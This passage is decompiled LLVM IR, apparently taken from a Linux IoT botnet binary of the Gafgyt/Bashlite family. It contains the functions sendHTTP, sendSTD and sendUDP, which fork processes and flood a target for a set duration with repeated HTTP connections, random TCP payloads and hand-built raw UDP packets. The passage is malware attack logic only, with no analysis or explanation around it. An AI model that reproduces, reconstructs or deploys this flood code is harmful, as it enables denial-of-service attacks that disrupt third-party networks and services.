  %stack_var_-44.0 = phi i32 [ %v3_804e6f4, %dec_label_pc_804e75d ], [ 0, %entry ], [ 0, %dec_label_pc_804e69e ], [ 0, %dec_label_pc_804e735 ]
  %v2_804e766 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e766, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_804e6f4, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804e763, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-796 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e76c = load i32, i32* @ebx, align 4
  store i32 %v0_804e76c, i32* %stack_var_-12, align 4
  %v4_804e798 = bitcast i32* %stack_var_-272 to i16*
  %v5_804e798 = call i32 @memcpy(i16* %v4_804e798, i32 ptrtoint ([62 x i8*]* @global_var_805cf60.814 to i32), i32 248)
  %v2_804e7c2 = call i32 @__GI_time(i32* null)
  %v5_804e7c7 = add i32 %v2_804e7c2, %arg5
  store i32 %v5_804e7c7, i32* @eax, align 4
  %v1_804e7cd = call i32 @random()
  %v2_804e7f0 = srem i32 %v1_804e7cd, 65
  store i32 %v2_804e7f0, i32* @eax, align 4
  %v0_804e817 = load i32, i32* @ebp, align 4
  %v2_804e817 = mul nsw i32 %v2_804e7f0, 4
  %v3_804e817 = add i32 %v2_804e817, -268
  %v4_804e817 = add i32 %v3_804e817, %v0_804e817
  %v5_804e817 = inttoptr i32 %v4_804e817 to i32*
  %v6_804e817 = load i32, i32* %v5_804e817, align 4
  store i32 %v6_804e817, i32* @ebx, align 4
  %v1_804e81e = call i32 @random()
  %v2_804e84c = srem i32 %v1_804e81e, 3
  store i32 %v2_804e84c, i32* @edi, align 4
  %v2_804e89b = ptrtoint i32* %stack_var_-796 to i32
  %v3_804e8a4 = call i32 @sprintf(i32 %v2_804e89b, i32 ptrtoint ([62 x i8]* @global_var_805d070.818 to i32))
  %v5_804e94e43 = icmp sgt i32 %arg6, 0
  br i1 %v5_804e94e43, label %dec_label_pc_804e8b5, label %dec_label_pc_804e954

dec_label_pc_804e8b5:                             ; preds = %entry, %dec_label_pc_804e945
  %storemerge44 = phi i32 [ %v4_804e945, %dec_label_pc_804e945 ], [ 0, %entry ]
  %v1_804e8b5 = call i32 @__libc_fork(i32 %storemerge44)
  %v1_804e8ba = icmp eq i32 %v1_804e8b5, 0
  br i1 %v1_804e8ba, label %dec_label_pc_804e945, label %dec_label_pc_804e928.preheader

dec_label_pc_804e928.preheader:                   ; preds = %dec_label_pc_804e8b5
  %v4_804e8f7 = bitcast i32* %stack_var_-796 to i8*
  br label %dec_label_pc_804e928

dec_label_pc_804e8c4:                             ; preds = %dec_label_pc_804e928
  store i32 %arg1, i32* @edx, align 4
  %v4_804e8d5 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804e8dd = icmp eq i32 %v4_804e8d5, 0
  br i1 %v4_804e8dd, label %dec_label_pc_804e928, label %dec_label_pc_804e8e3

dec_label_pc_804e8e3:                             ; preds = %dec_label_pc_804e8c4
  store i1 false, i1* @df, align 1
  store i32 %v2_804e89b, i32* @edi, align 4
  %v3_804e8fd = call i32 @_strlen(i8* %v4_804e8f7)
  %v5_804e918 = call i32 @__libc_write(i32 %v4_804e8d5, i32* nonnull %stack_var_-796, i32 %v3_804e8fd)
  %v1_804e923 = call i32 @__libc_close(i32 %v4_804e8d5)
  br label %dec_label_pc_804e928

dec_label_pc_804e928:                             ; preds = %dec_label_pc_804e8c4, %dec_label_pc_804e8e3, %dec_label_pc_804e928.preheader
  %v2_804e92f = call i32 @__GI_time(i32* null)
  %v5_804e937 = icmp slt i32 %v2_804e92f, %v5_804e7c7
  br i1 %v5_804e937, label %dec_label_pc_804e8c4, label %dec_label_pc_804e939

dec_label_pc_804e939:                             ; preds = %dec_label_pc_804e928
  %v1_804e940 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804e945:                             ; preds = %dec_label_pc_804e8b5
  %v4_804e945 = add nuw nsw i32 %storemerge44, 1
  %v5_804e94e = icmp slt i32 %v4_804e945, %arg6
  br i1 %v5_804e94e, label %dec_label_pc_804e8b5, label %dec_label_pc_804e954

dec_label_pc_804e954:                             ; preds = %dec_label_pc_804e945, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804e945, %dec_label_pc_804e945 ]
  %v2_804e95a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e95a, i32* @ebx, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804e945, { 0, 2, 1 }
  uselistorder i32 %v4_804e8d5, { 1, 0, 2 }
  uselistorder i32 %storemerge44, { 1, 0 }
  uselistorder i32 %v2_804e7f0, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e928, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e8b5, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e95e = load i32, i32* @ebp, align 4
  store i32 %v0_804e95e, i32* %stack_var_-4, align 4
  %v4_804e95e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804e95e, i32* @ebp, align 4
  %v4_804e97e = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804e98d = call i32 @__GI_time(i32* null)
  %v1_804e99b = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804e9a3 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804e9c4 = add i32 %v1_804e99b, 12
  %v2_804e9c4 = inttoptr i32 %v1_804e9c4 to i32*
  %v3_804e9c4 = load i32, i32* %v2_804e9c4, align 4
  %v2_804e9cc = ptrtoint i32* %stack_var_-36 to i32
  %v1_804e9d2 = add i32 %v1_804e99b, 16
  %v2_804e9d2 = inttoptr i32 %v1_804e9d2 to i32*
  %v3_804e9d2 = load i32, i32* %v2_804e9d2, align 4
  %v1_804e9d5 = inttoptr i32 %v3_804e9d2 to i32*
  %v2_804e9d5 = load i32, i32* %v1_804e9d5, align 4
  %v4_804e9e2 = call i32 @bcopy(i32 %v2_804e9d5, i32 %v2_804e9cc, i32 %v3_804e9c4)
  %v1_804e9ea = add i32 %v1_804e99b, 8
  %v2_804e9ea = inttoptr i32 %v1_804e9ea to i32*
  %v3_804e9ea = load i32, i32* %v2_804e9ea, align 4
  %v1_804e9ed = urem i32 %v3_804e9ea, 65536
  store i32 %v1_804e9ed, i32* %stack_var_-40, align 4
  %v4_804ea20 = bitcast i32* %stack_var_-184 to i16*
  %v5_804eac8 = add i32 %v2_804e98d, %arg3
  br label %dec_label_pc_804ea05

dec_label_pc_804ea05:                             ; preds = %dec_label_pc_804eaed, %entry
  %storemerge = phi i32 [ %v4_804eaed, %dec_label_pc_804eaed ], [ 0, %entry ]
  %v5_804ea20 = call i32 @memcpy(i16* %v4_804ea20, i32 ptrtoint ([36 x i8*]* @global_var_805d240.855 to i32), i32 144)
  store i32 %v5_804ea20, i32* @eax, align 4
  %v0_804ea25 = call i32 @random()
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_804eaed, label %dec_label_pc_804ea7b

dec_label_pc_804ea7b:                             ; preds = %dec_label_pc_804ea05
  %v0_804ea6b = load i32, i32* @ebp, align 4
  %v3_804ea6b = add i32 %v0_804ea6b, -180
  %v2_804ea40 = udiv i32 %v0_804ea25, 36
  %tmp29 = mul nsw i32 %v2_804ea40, -4
  %v2_804ea5d = add i32 %v0_804ea25, %tmp29
  %v2_804ea6b = mul i32 %v2_804ea5d, 4
  %v4_804ea6b = add i32 %v3_804ea6b, %v2_804ea6b
  %v5_804ea6b = inttoptr i32 %v4_804ea6b to i32*
  %v6_804ea6b = load i32, i32* %v5_804ea6b, align 4
  %v5_804ea98 = call i32 @__libc_send(i32 %v4_804e97e, i32 %v6_804ea6b, i32 75, i32 0)
  %v4_804eab2 = call i32 @__libc_connect(i32 %v4_804e97e, i32 %v2_804e9a3, i32 16)
  %v2_804eabe = call i32 @__GI_time(i32* null)
  %v5_804eacd = icmp slt i32 %v2_804eabe, %v5_804eac8
  br i1 %v5_804eacd, label %dec_label_pc_804eaed, label %dec_label_pc_804eacf

dec_label_pc_804eacf:                             ; preds = %dec_label_pc_804ea7b
  %v1_804ead5 = call i32 @__libc_close(i32 %v4_804e97e)
  %v1_804eae1 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804eaed:                             ; preds = %dec_label_pc_804ea7b, %dec_label_pc_804ea05
  %stack_var_-12.0 = phi i32 [ %storemerge, %dec_label_pc_804ea05 ], [ 0, %dec_label_pc_804ea7b ]
  %v4_804eaed = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_804ea05

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804e99b, { 1, 0, 2 }
  uselistorder i32 %v4_804e97e, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 144, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_4()
  %tmp25 = call i16 @__decompiler_undefined_function_4()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-140 = alloca i8*, align 4
  %v0_804eaf9 = load i32, i32* @ebx, align 4
  %v13_804eafa = ptrtoint i8** %stack_var_-140 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804eb03 = icmp eq i32 %arg2, 0
  %v1_804eb07 = icmp eq i1 %v4_804eb03, false
  br i1 %v1_804eb07, label %dec_label_pc_804eb17, label %dec_label_pc_804eb09

dec_label_pc_804eb09:                             ; preds = %entry
  %v1_804eb09 = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804eb2c

dec_label_pc_804eb17:                             ; preds = %entry
  %v1_804eb1a = urem i32 %arg2, 65536
  store i32 %v1_804eb1a, i32* %eax.global-to-local, align 4
  %v4_804eb1d = inttoptr i32 %v1_804eb1a to i8*
  store i8* %v4_804eb1d, i8** %stack_var_-140, align 4
  %v2_804eb20 = trunc i32 %arg2 to i16
  %v3_804eb20 = call i32 @htons(i16 %v2_804eb20)
  br label %dec_label_pc_804eb2c

dec_label_pc_804eb2c:                             ; preds = %dec_label_pc_804eb09, %dec_label_pc_804eb17
  %v2_804eb2c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804eb39 = inttoptr i32 %arg1 to i8*
  store i8* %v4_804eb39, i8** %stack_var_-140, align 4
  %v5_804eb3c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v5_804eb3c, i32* %eax.global-to-local, align 4
  %v1_804eb41 = icmp eq i32 %v5_804eb3c, 0
  %v1_804eb43 = icmp eq i1 %v1_804eb41, false
  br i1 %v1_804eb43, label %dec_label_pc_804ef89, label %dec_label_pc_804eb49

dec_label_pc_804eb49:                             ; preds = %dec_label_pc_804eb2c
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804eb62 = icmp eq i32 %arg4, 32
  %v1_804eb66 = icmp eq i1 %v9_804eb62, false
  br i1 %v1_804eb66, label %dec_label_pc_804ec70, label %dec_label_pc_804eb6c

dec_label_pc_804eb6c:                             ; preds = %dec_label_pc_804eb49
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-140, align 4
  %v5_804eb83 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v5_804eb83, i32* %eax.global-to-local, align 4
  %v4_804eb8b = icmp eq i32 %v5_804eb83, 0
  %v1_804eb8f = icmp eq i1 %v4_804eb8b, false
  br i1 %v1_804eb8f, label %dec_label_pc_804ebab, label %dec_label_pc_804eb91

dec_label_pc_804eb91:                             ; preds = %dec_label_pc_804eb6c
  %v0_804eb91 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804eb91 = ptrtoint i8* %v0_804eb91 to i32
  store i32 %v1_804eb91, i32* %eax.global-to-local, align 4
  store i8* %v0_804eb91, i8** %stack_var_-140, align 4
  %v4_804eba1 = call i32 @HackerPrint(i32 %v1_804eb91, i32 ptrtoint ([27 x i8]* @global_var_805d2d0.856 to i32))
  store i32 %v4_804eba1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef89

dec_label_pc_804ebab:                             ; preds = %dec_label_pc_804eb6c
  %v1_804ebae = add i32 %arg5, 1
  store i32 %v1_804ebae, i32* %eax.global-to-local, align 4
  %v4_804ebaf = inttoptr i32 %v1_804ebae to i8*
  store i8* %v4_804ebaf, i8** %stack_var_-140, align 4
  %v2_804ebb2 = call i32 @malloc(i32 %v1_804ebae)
  store i32 %v2_804ebb2, i32* %eax.global-to-local, align 4
  %v4_804ebba = icmp eq i32 %v2_804ebb2, 0
  br i1 %v4_804ebba, label %dec_label_pc_804ef89, label %dec_label_pc_804ebc4

dec_label_pc_804ebc4:                             ; preds = %dec_label_pc_804ebab
  store i32 %v1_804ebae, i32* %edx.global-to-local, align 4
  %v1_804ebcd = inttoptr i32 %v2_804ebb2 to i8*
  store i32 %v2_804ebb2, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804ebd2 = and i32 %v2_804ebb2, -256
  store i32 %v1_804ebd2, i32* %eax.global-to-local, align 4
  %v5_804ebd4 = call i8* @_memset(i8* %v1_804ebcd, i32 %v1_804ebd2, i32 %v1_804ebae)
  store i32 %v2_804ebb2, i32* %eax.global-to-local, align 4
  store i8* %v1_804ebcd, i8** %stack_var_-140, align 4
  %v5_804ebe3 = call i32 @makeRandomStr(i8* %v1_804ebcd, i32 %arg5)
  store i32 %v5_804ebe3, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-140, align 4
  %v3_804ebef = call i32 @__GI_time(i32* null)
  %v5_804ebf4 = add i32 %v3_804ebef, %arg3
  store i32 %v5_804ebf4, i32* %eax.global-to-local, align 4
  %v4_804ec2b = inttoptr i32 %v5_804eb83 to i8*
  br label %dec_label_pc_804ec03

dec_label_pc_804ec03:                             ; preds = %dec_label_pc_804ec4d, %dec_label_pc_804ec6b, %dec_label_pc_804ebc4
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804ebc4 ], [ %v4_804ec6b, %dec_label_pc_804ec6b ], [ 0, %dec_label_pc_804ec4d ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v5_804eb83, i32* %eax.global-to-local, align 4
  store i8* %v4_804ec2b, i8** %stack_var_-140, align 4
  %v8_804ec2e = call i32 @__libc_sendto(i32 %v5_804eb83, i32 %v2_804ebb2, i32 %arg5, i32 0, i32 %v2_804eb2c, i32 16)
  store i32 %v8_804ec2e, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804ec36 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804ec39 = icmp eq i1 %v15_804ec36, false
  br i1 %v1_804ec39, label %dec_label_pc_804ec6b, label %dec_label_pc_804ec3b

dec_label_pc_804ec3b:                             ; preds = %dec_label_pc_804ec03
  br i1 %v1_804eb07, label %dec_label_pc_804ec4d, label %dec_label_pc_804ec41

dec_label_pc_804ec41:                             ; preds = %dec_label_pc_804ec3b
  %v0_804ec41 = load i8*, i8** %stack_var_-140, align 4
  %v1_804ec41 = ptrtoint i8* %v0_804ec41 to i32
  %v2_804ec41 = call i32 @rand_cmwc(i32 %v1_804ec41)
  %v1_804ec46 = urem i32 %v2_804ec41, 65536
  store i32 %v1_804ec46, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec4d

dec_label_pc_804ec4d:                             ; preds = %dec_label_pc_804ec3b, %dec_label_pc_804ec41
  store i8* null, i8** %stack_var_-140, align 4
  %v3_804ec54 = call i32 @__GI_time(i32* null)
  store i32 %v3_804ec54, i32* %eax.global-to-local, align 4
  %v8_804ec5c = icmp sgt i32 %v3_804ec54, %v5_804ebf4
  br i1 %v8_804ec5c, label %dec_label_pc_804ef89, label %dec_label_pc_804ec03

dec_label_pc_804ec6b:                             ; preds = %dec_label_pc_804ec03
  %v4_804ec6b = add i32 %stack_var_-84.0, 1
  br label %dec_label_pc_804ec03

dec_label_pc_804ec70:                             ; preds = %dec_label_pc_804eb49
  store i32 %v13_804eafa, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-140, align 4
  %v5_804ec8c = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v5_804ec8c, i32* %eax.global-to-local, align 4
  %v4_804ec94 = icmp eq i32 %v5_804ec8c, 0
  %v1_804ec98 = icmp eq i1 %v4_804ec94, false
  br i1 %v1_804ec98, label %dec_label_pc_804ecb4, label %dec_label_pc_804ec9a

dec_label_pc_804ec9a:                             ; preds = %dec_label_pc_804ec70
  %v0_804ec9a = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804ec9a = ptrtoint i8* %v0_804ec9a to i32
  store i32 %v1_804ec9a, i32* %eax.global-to-local, align 4
  store i8* %v0_804ec9a, i8** %stack_var_-140, align 4
  %v4_804ecaa = call i32 @HackerPrint(i32 %v1_804ec9a, i32 ptrtoint ([27 x i8]* @global_var_805d2d0.856 to i32))
  store i32 %v4_804ecaa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef86

dec_label_pc_804ecb4:                             ; preds = %dec_label_pc_804ec70
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804ecc3 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v5_804ec8c, i32* %eax.global-to-local, align 4
  %v4_804ecdd = inttoptr i32 %v5_804ec8c to i8*
  store i8* %v4_804ecdd, i8** %stack_var_-140, align 4
  %v7_804ece0 = call i32 @__GI_setsockopt(i32 %v5_804ec8c, i32 0, i32 3, i32 %v2_804ecc3, i32 4)
  store i32 %v7_804ece0, i32* %eax.global-to-local, align 4
  %v2_804ece5 = icmp slt i32 %v7_804ece0, 0
  %v1_804ece7 = icmp eq i1 %v2_804ece5, false
  br i1 %v1_804ece7, label %dec_label_pc_804ed36.preheader, label %dec_label_pc_804ece9

dec_label_pc_804ed36.preheader:                   ; preds = %dec_label_pc_804ecb4
  br label %dec_label_pc_804ed0c

dec_label_pc_804ece9:                             ; preds = %dec_label_pc_804ecb4
  %v0_804ece9 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804ece9 = ptrtoint i8* %v0_804ece9 to i32
  store i32 %v1_804ece9, i32* %eax.global-to-local, align 4
  store i8* %v0_804ece9, i8** %stack_var_-140, align 4
  %v4_804ecf9 = call i32 @HackerPrint(i32 %v1_804ece9, i32 ptrtoint ([33 x i8]* @global_var_805d2ec.857 to i32))
  store i32 %v4_804ecf9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef86

dec_label_pc_804ed0c:                             ; preds = %dec_label_pc_804ed36.preheader, %dec_label_pc_804ed0c
  %v4_804ed3663 = phi i32 [ 49, %dec_label_pc_804ed36.preheader ], [ %v4_804ed36, %dec_label_pc_804ed0c ]
  store i8* null, i8** %stack_var_-140, align 4
  %v3_804ed13 = call i32 @__GI_time(i32* null)
  store i32 %v3_804ed13, i32* %eax.global-to-local, align 4
  store i32 %v3_804ed13, i32* @ebx, align 4
  %v0_804ed1a = load i8*, i8** %stack_var_-140, align 4
  %v1_804ed1a = ptrtoint i8* %v0_804ed1a to i32
  %v2_804ed1a = call i32 @rand_cmwc(i32 %v1_804ed1a)
  %v1_804ed1f = load i32, i32* @ebx, align 4
  %v2_804ed1f = xor i32 %v1_804ed1f, %v2_804ed1a
  store i32 %v2_804ed1f, i32* @eax, align 4
  %v4_804ed21 = inttoptr i32 %v2_804ed1f to i8*
  store i8* %v4_804ed21, i8** %stack_var_-140, align 4
  %v2_804ed24 = call i32 @srand(i32 %v2_804ed1f)
  store i32 %v2_804ed24, i32* @eax, align 4
  %v0_804ed29 = call i32 @random()
  store i32 %v0_804ed29, i32* %eax.global-to-local, align 4
  %v4_804ed2e = inttoptr i32 %v0_804ed29 to i8*
  store i8* %v4_804ed2e, i8** %stack_var_-140, align 4
  %v2_804ed31 = call i32 @init_rand(i32 %v0_804ed29)
  store i32 %v2_804ed31, i32* %eax.global-to-local, align 4
  %v4_804ed36 = add nsw i32 %v4_804ed3663, -1
  %v13_804ed39 = icmp eq i32 %v4_804ed3663, 0
  %v1_804ed3d = icmp eq i1 %v13_804ed39, false
  br i1 %v1_804ed3d, label %dec_label_pc_804ed0c, label %dec_label_pc_804ed3f

dec_label_pc_804ed3f:                             ; preds = %dec_label_pc_804ed0c
  %v4_804ed3f = icmp eq i32 %arg4, 0
  %v1_804ed43 = icmp eq i1 %v4_804ed3f, false
  br i1 %v1_804ed43, label %dec_label_pc_804ed4e, label %dec_label_pc_804ed64

dec_label_pc_804ed4e:                             ; preds = %dec_label_pc_804ed3f
  %v5_804ed55 = sub i32 32, %arg4
  %v2_804ed5d = urem i32 %v5_804ed55, 32
  %v4_804ed5d = icmp eq i32 %v2_804ed5d, 0
  br i1 %v4_804ed5d, label %bb62, label %bb

bb:                                               ; preds = %dec_label_pc_804ed4e
  %v5_804ed5d = shl i32 1, %v2_804ed5d
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_804ed4e, %bb
  %v0_804ed5f = phi i32 [ %v5_804ed5d, %bb ], [ 1, %dec_label_pc_804ed4e ]
  %v1_804ed5f = sub i32 0, %v0_804ed5f
  store i32 %v1_804ed5f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed64

dec_label_pc_804ed64:                             ; preds = %dec_label_pc_804ed3f, %bb62
  %storemerge8 = phi i32 [ %v1_804ed5f, %bb62 ], [ 0, %dec_label_pc_804ed3f ]
  %v1_804ed67 = add i32 %arg5, 28
  %v1_804ed73 = add i32 %arg5, 58
  %v2_804ed76 = and i32 %v1_804ed73, -16
  %v0_804ed7c = load i32, i32* @esp, align 4
  %v2_804ed7c = sub i32 %v0_804ed7c, %v2_804ed76
  %v1_804ed88 = add i32 %v2_804ed7c, 39
  %v2_804ed8b = and i32 %v1_804ed88, -16
  store i32 %v2_804ed8b, i32* %edx.global-to-local, align 4
  %v1_804eda3 = add i32 %v2_804ed8b, 20
  %v5_804eda6 = inttoptr i32 %v1_804eda3 to i16*
  %v1_804edac = add i32 %arg5, 8
  store i32 %v1_804edac, i32* @ebx, align 4
  store i32 %storemerge8, i32* @eax, align 4
  %v2_804edb4 = inttoptr i32 %v2_804ed7c to i32*
  store i32 %storemerge8, i32* %v2_804edb4, align 4
  %v1_804edb7 = call i32 @HackerScan2(i32 %v1_804ed67)
  store i32 %v1_804edb7, i32* %eax.global-to-local, align 4
  %v1_804edbc = load i32, i32* @esp, align 4
  %v2_804edbc = inttoptr i32 %v1_804edbc to i32*
  store i32 %v1_804edb7, i32* %v2_804edbc, align 4
  %v0_804edbf = call i32 @htonl()
  %v3_804edc4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804edc4, i32* %edx.global-to-local, align 4
  %v0_804edc7 = load i32, i32* @ebx, align 4
  %v1_804edc7 = load i32, i32* @esp, align 4
  %v2_804edc7 = add i32 %v1_804edc7, 16
  %v3_804edc7 = inttoptr i32 %v2_804edc7 to i32*
  store i32 %v0_804edc7, i32* %v3_804edc7, align 4
  %v0_804edcb = load i32, i32* @esp, align 4
  %v1_804edcb = add i32 %v0_804edcb, 12
  %v2_804edcb = inttoptr i32 %v1_804edcb to i32*
  store i32 17, i32* %v2_804edcb, align 4
  %v1_804edd3 = load i32, i32* @esp, align 4
  %v2_804edd3 = add i32 %v1_804edd3, 8
  %v3_804edd3 = inttoptr i32 %v2_804edd3 to i32*
  store i32 %v0_804edbf, i32* %v3_804edd3, align 4
  %v0_804edd7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804edd7 = load i32, i32* @esp, align 4
  %v2_804edd7 = add i32 %v1_804edd7, 4
  %v3_804edd7 = inttoptr i32 %v2_804edd7 to i32*
  store i32 %v0_804edd7, i32* %v3_804edd7, align 4
  store i32 %v2_804ed8b, i32* %eax.global-to-local, align 4
  %v1_804edde = load i32, i32* @esp, align 4
  %v2_804edde = inttoptr i32 %v1_804edde to i32*
  store i32 %v2_804ed8b, i32* %v2_804edde, align 4
  %v0_804ede1 = call i32 @makeIPPacket()
  %v1_804edef = urem i32 %v1_804edac, 65536
  store i32 %v1_804edef, i32* %eax.global-to-local, align 4
  %v1_804edf2 = load i32, i32* @esp, align 4
  %v2_804edf2 = inttoptr i32 %v1_804edf2 to i32*
  store i32 %v1_804edef, i32* %v2_804edf2, align 4
  %v2_804edf5 = trunc i32 %v1_804eda3 to i16
  %v3_804edf5 = call i32 @htons(i16 %v2_804edf5)
  %v1_804edfa = urem i32 %v3_804edf5, 65536
  store i32 %v1_804edfa, i32* %edx.global-to-local, align 4
  store i32 %v1_804eda3, i32* %eax.global-to-local, align 4
  %v1_804ee00 = trunc i32 %v3_804edf5 to i16
  %v3_804ee00 = add i32 %v2_804ed8b, 24
  %v4_804ee00 = inttoptr i32 %v3_804ee00 to i16*
  store i16 %v1_804ee00, i16* %v4_804ee00, align 8
  %v2_804ee04 = call i32 @rand_cmwc(i32 %v1_804eda3)
  %v1_804ee09 = urem i32 %v2_804ee04, 65536
  store i32 %v1_804ee09, i32* %edx.global-to-local, align 4
  store i32 %v1_804eda3, i32* %eax.global-to-local, align 4
  %v1_804ee0f = trunc i32 %v2_804ee04 to i16
  store i16 %v1_804ee0f, i16* %v5_804eda6, align 4
  br i1 %v1_804eb07, label %dec_label_pc_804ee25, label %dec_label_pc_804ee18

dec_label_pc_804ee18:                             ; preds = %dec_label_pc_804ed64
  %v2_804ee18 = call i32 @rand_cmwc(i32 %v1_804eda3)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_804ee39

dec_label_pc_804ee25:                             ; preds = %dec_label_pc_804ed64
  %v1_804ee28 = urem i32 %arg2, 65536
  store i32 %v1_804ee28, i32* %eax.global-to-local, align 4
  %v1_804ee2b = load i32, i32* @esp, align 4
  %v2_804ee2b = inttoptr i32 %v1_804ee2b to i32*
  store i32 %v1_804ee28, i32* %v2_804ee2b, align 4
  %v3_804ee2e = call i32 @htons(i16 %tmp25)
  br label %dec_label_pc_804ee39

dec_label_pc_804ee39:                             ; preds = %dec_label_pc_804ee18, %dec_label_pc_804ee25
  %v1_804eef2.pre-phi = phi i32 [ %.pre, %dec_label_pc_804ee18 ], [ %v1_804ee28, %dec_label_pc_804ee25 ]
  %storemerge10.in = phi i32 [ %v2_804ee18, %dec_label_pc_804ee18 ], [ %v3_804ee2e, %dec_label_pc_804ee25 ]
  %storemerge7 = trunc i32 %storemerge10.in to i16
  %sext = mul i32 %storemerge10.in, 65536
  %v4_804ee3c = sdiv i32 %sext, 65536
  %v3_804ee3f = add i32 %v2_804ed8b, 22
  %v4_804ee3f = inttoptr i32 %v3_804ee3f to i16*
  store i16 %storemerge7, i16* %v4_804ee3f, align 2
  %v1_804ee46 = add i32 %v2_804ed8b, 26
  %v2_804ee46 = inttoptr i32 %v1_804ee46 to i16*
  store i16 0, i16* %v2_804ee46, align 2
  %v1_804ee4f = add i32 %v2_804ed8b, 28
  store i32 %v1_804ee4f, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804ee55 = load i32, i32* @esp, align 4
  %v2_804ee55 = add i32 %v1_804ee55, 4
  %v3_804ee55 = inttoptr i32 %v2_804ee55 to i32*
  store i32 %arg5, i32* %v3_804ee55, align 4
  %v0_804ee59 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee59 = load i32, i32* @esp, align 4
  %v2_804ee59 = inttoptr i32 %v1_804ee59 to i32*
  store i32 %v0_804ee59, i32* %v2_804ee59, align 4
  %v3_804ee5c = sext i16 %tmp to i32
  %v4_804ee5c = inttoptr i32 %v4_804ee3c to i8*
  %v5_804ee5c = call i32 @makeRandomStr(i8* %v4_804ee5c, i32 %v3_804ee5c)
  store i32 %v2_804ed8b, i32* %eax.global-to-local, align 4
  %v1_804ee64 = or i32 %v2_804ed8b, 2
  %v2_804ee64 = inttoptr i32 %v1_804ee64 to i16*
  %v3_804ee64 = load i16, i16* %v2_804ee64, align 2
  %v4_804ee64 = zext i16 %v3_804ee64 to i32
  store i32 %v4_804ee64, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed8b, i32* %eax.global-to-local, align 4
  %v1_804ee6d = load i32, i32* @esp, align 4
  %v2_804ee6d = add i32 %v1_804ee6d, 4
  %v3_804ee6d = inttoptr i32 %v2_804ee6d to i32*
  store i32 %v4_804ee64, i32* %v3_804ee6d, align 4
